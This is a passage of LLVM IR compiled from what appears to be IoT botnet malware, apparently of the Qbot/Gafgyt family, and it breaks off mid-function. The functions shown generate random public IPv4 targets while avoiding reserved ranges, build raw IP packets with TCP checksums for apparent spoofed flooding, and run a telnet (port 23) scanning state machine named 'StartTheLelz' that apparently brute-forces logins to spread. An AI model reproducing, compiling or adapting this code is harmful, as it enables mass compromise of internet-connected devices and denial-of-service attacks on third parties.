  %131 = load i8*, i8** %15, align 8
  %132 = call i32 @matchPrompt(i8* %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %122
  store i32 1, i32* %20, align 4
  br label %137

; <label>:135:                                    ; preds = %130, %127
  br label %136

; <label>:136:                                    ; preds = %135, %121
  br label %33

; <label>:137:                                    ; preds = %134, %76, %48
  %138 = load i32, i32* %20, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %9, align 4
  br label %142

; <label>:141:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %140, %120, %111, %91
  %143 = load i32, i32* %9, align 4
  ret i32 %143
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %27

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %27

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = add i8 %12, 1
  store i8 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %14 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 16, i32 16, i1 false)
  %15 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %17 = zext i8 %16 to i32
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %23 = zext i8 %22 to i32
  %24 = call i32 (i8*, i8*, ...) @szprintf(i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %17, i32 %19, i32 %21, i32 %23)
  %25 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %26 = call i32 @inet_addr(i8* %25) #4
  store i32 %26, i32* %1, align 4
  br label %177

; <label>:27:                                     ; preds = %7, %0
  %28 = call i32 @rand() #4
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %31 = call i32 @rand() #4
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %34 = call i32 @rand() #4
  %35 = srem i32 %34, 255
  %36 = trunc i32 %35 to i8
  store i8 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %37

; <label>:37:                                     ; preds = %155, %27
  %38 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %153, label %41

; <label>:41:                                     ; preds = %37
  %42 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 10
  br i1 %44, label %153, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 100
  br i1 %48, label %49, label %57

; <label>:49:                                     ; preds = %45
  %50 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp sge i32 %51, 64
  br i1 %52, label %53, label %57

; <label>:53:                                     ; preds = %49
  %54 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %55 = zext i8 %54 to i32
  %56 = icmp sle i32 %55, 127
  br i1 %56, label %153, label %57

; <label>:57:                                     ; preds = %53, %49, %45
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 127
  br i1 %60, label %153, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 169
  br i1 %64, label %65, label %69

; <label>:65:                                     ; preds = %61
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 254
  br i1 %68, label %153, label %69

; <label>:69:                                     ; preds = %65, %61
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 172
  br i1 %72, label %73, label %81

; <label>:73:                                     ; preds = %69
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp sle i32 %75, 16
  br i1 %76, label %77, label %81

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 31
  br i1 %80, label %153, label %81

; <label>:81:                                     ; preds = %77, %73, %69
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 192
  br i1 %84, label %85, label %93

; <label>:85:                                     ; preds = %81
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %93

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 2
  br i1 %92, label %153, label %93

; <label>:93:                                     ; preds = %89, %85, %81
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 192
  br i1 %96, label %97, label %105

; <label>:97:                                     ; preds = %93
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 88
  br i1 %100, label %101, label %105

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %153, label %105

; <label>:105:                                    ; preds = %101, %97, %93
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 192
  br i1 %108, label %109, label %113

; <label>:109:                                    ; preds = %105
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 168
  br i1 %112, label %153, label %113

; <label>:113:                                    ; preds = %109, %105
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 198
  br i1 %116, label %117, label %125

; <label>:117:                                    ; preds = %113
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 18
  br i1 %120, label %153, label %121

; <label>:121:                                    ; preds = %117
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 19
  br i1 %124, label %153, label %125

; <label>:125:                                    ; preds = %121, %113
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 198
  br i1 %128, label %129, label %137

; <label>:129:                                    ; preds = %125
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 51
  br i1 %132, label %133, label %137

; <label>:133:                                    ; preds = %129
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 100
  br i1 %136, label %153, label %137

; <label>:137:                                    ; preds = %133, %129, %125
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 203
  br i1 %140, label %141, label %149

; <label>:141:                                    ; preds = %137
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %145, label %149

; <label>:145:                                    ; preds = %141
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 113
  br i1 %148, label %153, label %149

; <label>:149:                                    ; preds = %145, %141, %137
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp sge i32 %151, 224
  br label %153

; <label>:153:                                    ; preds = %149, %145, %133, %121, %117, %109, %101, %89, %77, %65, %57, %53, %41, %37
  %154 = phi i1 [ true, %145 ], [ true, %133 ], [ true, %121 ], [ true, %117 ], [ true, %109 ], [ true, %101 ], [ true, %89 ], [ true, %77 ], [ true, %65 ], [ true, %57 ], [ true, %53 ], [ true, %41 ], [ true, %37 ], [ %152, %149 ]
  br i1 %154, label %155, label %165

; <label>:155:                                    ; preds = %153
  %156 = call i32 @rand() #4
  %157 = srem i32 %156, 255
  %158 = trunc i32 %157 to i8
  store i8 %158, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %159 = call i32 @rand() #4
  %160 = srem i32 %159, 255
  %161 = trunc i32 %160 to i8
  store i8 %161, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %162 = call i32 @rand() #4
  %163 = srem i32 %162, 255
  %164 = trunc i32 %163 to i8
  store i8 %164, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %37

; <label>:165:                                    ; preds = %153
  %166 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %166, i8 0, i64 16, i32 16, i1 false)
  %167 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %169 = zext i8 %168 to i32
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %173 = zext i8 %172 to i32
  %174 = call i32 (i8*, i8*, ...) @szprintf(i8* %167, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i32 0, i32 0), i32 %169, i32 %171, i32 %173)
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %176 = call i32 @inet_addr(i8* %175) #4
  store i32 %176, i32* %1, align 4
  br label %177

; <label>:177:                                    ; preds = %165, %11
  %178 = load i32, i32* %1, align 4
  ret i32 %178
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #4
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #4
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #1

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = call i32 @getdtablesize() #4
  %14 = sdiv i32 %13, 4
  %15 = mul nsw i32 %14, 3
  store i32 %15, i32* %1, align 4
  %16 = load i32, i32* %1, align 4
  %17 = icmp sgt i32 %16, 4096
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %0
  br label %21

; <label>:19:                                     ; preds = %0
  %20 = load i32, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %19, %18
  %22 = phi i32 [ 4096, %18 ], [ %20, %19 ]
  store i32 %22, i32* %1, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %27 = getelementptr inbounds [8 x i8], [8 x i8]* %26, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 8, i32 4, i1 false)
  %28 = load i32, i32* %1, align 4
  %29 = zext i32 %28 to i64
  %30 = call i8* @llvm.stacksave()
  store i8* %30, i8** %9, align 8
  %31 = alloca %struct.telstate_t, i64 %29, align 16
  %32 = bitcast %struct.telstate_t* %31 to i8*
  %33 = load i32, i32* %1, align 4
  %34 = sext i32 %33 to i64
  %35 = mul i64 %34, 5
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 %35, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %36

; <label>:36:                                     ; preds = %55, %21
  %37 = load i32, i32* %2, align 4
  %38 = load i32, i32* %1, align 4
  %39 = icmp slt i32 %37, %38
  br i1 %39, label %40, label %58

; <label>:40:                                     ; preds = %36
  %41 = load i32, i32* %2, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %42
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i32 0, i32 3
  store i8 1, i8* %44, align 1
  %45 = call noalias i8* @malloc(i64 1024) #4
  %46 = load i32, i32* %2, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %47
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i32 0, i32 8
  store i8* %45, i8** %49, align 8
  %50 = load i32, i32* %2, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %51
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %52, i32 0, i32 8
  %54 = load i8*, i8** %53, align 8
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 1024, i32 1, i1 false)
  br label %55

; <label>:55:                                     ; preds = %40
  %56 = load i32, i32* %2, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %2, align 4
  br label %36

; <label>:58:                                     ; preds = %36
  br label %59

; <label>:59:                                     ; preds = %1281, %58
  br label %60

; <label>:60:                                     ; preds = %59
  store i32 0, i32* %2, align 4
  br label %61

; <label>:61:                                     ; preds = %1278, %60
  %62 = load i32, i32* %2, align 4
  %63 = load i32, i32* %1, align 4
  %64 = icmp slt i32 %62, %63
  br i1 %64, label %65, label %1281

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* %2, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %67
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %68, i32 0, i32 2
  %70 = load i8, i8* %69, align 8
  %71 = zext i8 %70 to i32
  switch i32 %71, label %1277 [
    i32 0, label %72
    i32 1, label %215
    i32 2, label %371
    i32 3, label %458
    i32 4, label %526
    i32 5, label %650
    i32 6, label %718
    i32 7, label %862
    i32 8, label %890
    i32 9, label %918
    i32 10, label %946
    i32 100, label %1078
    i32 101, label %1106
    i32 102, label %1134
    i32 103, label %1162
  ]

; <label>:72:                                     ; preds = %65
  %73 = load i32, i32* %2, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %74
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %75, i32 0, i32 8
  %77 = load i8*, i8** %76, align 8
  call void @llvm.memset.p0i8.i64(i8* %77, i8 0, i64 1024, i32 1, i1 false)
  %78 = load i32, i32* %2, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 3
  %82 = load i8, i8* %81, align 1
  %83 = icmp ne i8 %82, 0
  br i1 %83, label %84, label %104

; <label>:84:                                     ; preds = %72
  %85 = load i32, i32* %2, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %86
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %87, i32 0, i32 8
  %89 = load i8*, i8** %88, align 8
  store i8* %89, i8** %10, align 8
  %90 = load i32, i32* %2, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %91
  %93 = bitcast %struct.telstate_t* %92 to i8*
  call void @llvm.memset.p0i8.i64(i8* %93, i8 0, i64 32, i32 16, i1 false)
  %94 = load i8*, i8** %10, align 8
  %95 = load i32, i32* %2, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 8
  store i8* %94, i8** %98, align 8
  %99 = call i32 @getRandomPublicIP()
  %100 = load i32, i32* %2, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 1
  store i32 %99, i32* %103, align 4
  br label %143

; <label>:104:                                    ; preds = %72
  %105 = load i32, i32* %2, align 4
